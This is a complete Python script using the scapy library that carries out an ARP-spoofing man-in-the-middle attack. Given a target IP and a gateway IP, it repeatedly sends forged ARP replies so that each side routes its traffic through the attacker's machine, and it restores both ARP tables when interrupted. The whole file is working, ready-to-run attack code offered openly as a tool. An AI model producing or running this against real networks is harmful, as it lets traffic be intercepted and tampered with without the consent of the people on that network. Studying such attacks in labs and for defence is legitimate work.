#!/usr/bin/env python3

import scapy.all as scapy
import argparse, time


def get_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument("-t", "--target", help="Provide Target IP Address", dest="target")
    arg_parser.add_argument("-g", "--gateway", help="Provide Gateway IP Address", dest="gateway")
    options = arg_parser.parse_args()

    if not options.target or not options.gateway:
        arg_parser.print_help()
        exit()
    return options

# Get MAC Address for a IP Address by scanning the network
def get_mac(ip_address):

    arp_request = scapy.ARP(pdst=ip_address)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    packet_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    return packet_list[0][1].hwsrc

# ARP Spoofing the target
def arp_spoof(target_ip, spoof_ip):

    # op=2 indicates ARP Response
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(arp_response_packet, verbose=False)

# Restoring the MAC Address in ARP tables of destination
def restore_arp(dest_ip, src_ip):

    arp_response_packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=get_mac(dest_ip), psrc=src_ip, hwsrc=get_mac(src_ip))
    scapy.send(arp_response_packet, verbose=False)


def mitm(target_ip, gateway):

    # Counter to record the number of packets sent to spoof target and gateway
    sent_packets = 0
    try:

        # Sending ARP response packets on loop to spoof of target and gateway
        while True:
            # Tricking target to identify yourself as the router
            arp_spoof(target_ip, gateway)
            # Tricking router to identify yourself as the target
            arp_spoof(gateway, target_ip)
            sent_packets += 2
            print("\r[+] Packets sent : " + str(sent_packets), end="")
            time.sleep(2)

    except KeyboardInterrupt:
        # Manual Exit control for Keyboard interrupt
        print("\n[/] Detected Ctrl + C. . . . Resetting ARP tables, Please Wait.")

        # Restoring ARP tables for target IP and gateway
        restore_arp(target_ip, gateway)
        print("[+] Restored Target ARP Table")
        restore_arp(gateway, target_ip)
        print("[+] Restored Gateway ARP Table")
        print("[+] Thank You!")


if __name__ == "__main__":
    # Get target IP and gateway IP as arguments
    options = get_args()
    # Call Man in the Middle Attack on the target machine
    mitm(options.target, options.gateway)